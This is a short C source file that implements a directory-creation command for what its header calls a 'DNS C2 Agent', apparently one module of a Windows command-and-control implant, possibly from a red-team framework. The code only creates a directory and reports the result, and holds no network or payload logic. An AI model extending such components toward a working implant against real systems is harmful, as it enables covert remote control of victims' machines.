/**
 * mkdir.c - Create directory command for DNS C2 Agent
 */

 #include <windows.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include "../include/mkdir.h"
 #include "../include/Utils.h"
 
 /**
  * Create a directory
  */
 char* cmd_mkdir(const char* args) {
     if (args == NULL || *args == '\0') {
         return _strdup("Error: No directory specified");
     }
     
     // Use Unicode-aware function
     if (!create_directory(args)) {
         char* result = (char*)malloc(256);
         if (result != NULL) {
             sprintf_s(result, 256, "Error: Could not create directory '%s'", args);
         }
         return result;
     }
     
     char* result = (char*)malloc(256);
     if (result != NULL) {
         sprintf_s(result, 256, "Successfully created directory '%s'", args);
     }
     return result;
 }
 